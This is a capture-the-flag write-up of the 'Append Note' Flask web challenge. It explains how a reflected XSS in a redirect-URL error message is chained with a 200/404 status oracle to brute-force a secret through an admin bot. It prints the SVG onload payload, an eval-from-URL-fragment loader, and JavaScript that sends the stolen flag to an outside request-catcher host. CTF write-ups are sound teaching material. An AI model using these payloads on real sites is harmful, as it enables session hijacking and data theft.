## Append Note - LA CTF Web Challenge Writeup

### First Impressions

So we're given a Flask web app called "Append Note" - it's got this hilariously over-the-top Comic Sans UI with rainbow gradients. Very tongue-in-cheek. But behind the goofy styling there's actually a pretty neat challenge.

Opening it up as a regular user, you just get a funny landing page that says reads are "eventually consistent with the heat death of the universe." Cute. But the real action is behind the admin cookie.

### Understanding the App

I started by reading through `app.py` to figure out what's going on. The app is pretty small - only a few routes:

- **`/`** - Landing page. Shows a form if you're admin, otherwise a joke message.
- **`/append`** - The interesting one. Admin-only. Takes a `content` param and a `url` param. It checks if any existing note starts with the content you submitted (returning 200 if yes, 404 if no), appends your content to the notes list, then redirects you to the URL you provided.
- **`/flag`** - Gives you the flag if you provide the correct `secret` param. Also has `Access-Control-Allow-Origin: *` which is important later.

The key thing I noticed: when the app starts, it generates a random 8-character hex string (`secrets.token_hex(4)`) and drops it into the notes array as the very first entry. If you can figure out that secret, you can hit `/flag?secret=<SECRET>` and get the flag.

So the challenge boils down to: **leak the SECRET**.

### Finding the Bug

The `/append` endpoint has a URL validation check:

```python
parsed_url = urlparse(redirect_url)
if (
    parsed_url.scheme not in ["http", "https"]
    or parsed_url.hostname != urlparse(HOST).hostname
):
    return f"Invalid redirect URL {parsed_url.scheme} {parsed_url.hostname}", 400
```

Two things jumped out at me here:

1. When the check fails, it **reflects `parsed_url.scheme` and `parsed_url.hostname` directly into the HTML response** with no escaping whatsoever. That's a reflected XSS waiting to happen.

2. Python's `urlparse` does some interesting stuff with hostnames. I knew it strips tabs, newlines, and carriage returns from hostnames, but I had a hunch it might preserve **spaces**.

I wrote a quick fuzzer (`fuzz_xss.py`) to test a bunch of payloads against the local instance. Tried tabs, newlines, various HTML tags - most got stripped by `urlparse`. But then I tried spaces in the hostname and there it was. `urlparse` leaves spaces alone, so something like:

```
http://<svg onload=alert(1)>.fake/
```

...gets parsed, the hostname check fails (obviously `.fake` doesn't match the challenge host), and the error message becomes:

```
Invalid redirect URL http <svg onload=alert(1)>.fake
```

Boom. The `<svg>` tag with its `onload` handler gets reflected straight into the response body. Since the response is `text/html`, the browser renders it and the JavaScript fires.

### The Admin Bot

Looking at the admin bot code, it's a standard CTF admin bot setup using Puppeteer. It sets an `admin` cookie on the challenge domain (SameSite: Lax, httpOnly), then visits whatever URL you give it and waits 60 seconds.

Since the cookie is SameSite: Lax, a top-level navigation to `/append` will include it. So if we send the admin bot a crafted URL pointing to `/append` with our XSS payload in the `url` parameter, the bot will:

1. Navigate to the URL with the admin cookie
2. The server validates the cookie (passes) but the URL check fails
3. Our XSS payload gets reflected and executes

### Building the Exploit

Here's where it gets fun. Once we have XSS running in the admin's browser on the challenge origin, we can make same-origin requests to `/append` and observe the status codes. Remember:

- **200** = some existing note starts with the content you submitted
- **404** = no match

The SECRET is 8 hex characters (`0-9a-f`). So we can brute-force it one character at a time. For each position, try all 16 hex chars. If `/append?content=<guess>` returns 200, that prefix exists in the notes - we found the next character. That's at most 8 x 16 = 128 requests. Very doable within the bot's 60-second window.

The exploit JS goes in the URL fragment (`#...`) so it never gets sent to the server. The XSS payload is just `<svg onload=eval(location.hash.slice(1))>` - super compact, and it pulls the actual exploit code from the fragment.

The exploit code itself:

```javascript
(async () => {
  const H = '0123456789abcdef';
  let s = '';
  for (let i = 0; i < 8; i++) {
    for (const c of H) {
      const r = await fetch('/append?content=' + (s + c) + '&url=' + location.origin + '/');
      if (r.status === 200) { s += c; break; }
    }
  }
  const f = await (await fetch('/flag?secret=' + s)).text();
  new Image().src = 'https://my.requestcatcher.com/?flag=' + encodeURIComponent(f);
})()
```

It brute-forces the secret character by character, then fetches the flag and exfiltrates it to a request catcher via an image tag. The `/flag` endpoint having `Access-Control-Allow-Origin: *` means we can read the response with `fetch` no problem.

### Putting It Together

The final payload URL looks something like:

```
https://challenge-host/append?content=x&url=http%3A%2F%2F%3Csvg%20onload%3Deval(location.hash.slice(1))%3E.fake%2F#(async()=>{...exploit code...})()
```

Submit that to the admin bot, wait a few seconds for it to churn through the 128 requests, and the flag shows up on the request catcher.

### What Made This Challenge Cool

I liked how several things had to click together:

- Spotting the unsanitized reflection in the error message
- Knowing that `urlparse` preserves spaces in hostnames (but strips tabs/newlines) - this was the key insight that made the XSS possible
- Recognizing the 200/404 status code oracle as a way to leak the secret one character at a time
- Using the URL fragment to carry the payload without it being processed server-side
- The `CORS: *` on `/flag` letting us read the response client-side

It's a clean chain: reflected XSS -> status-code oracle -> secret leak -> flag. No weird browser quirks or obscure tricks needed, just solid fundamentals put together nicely.
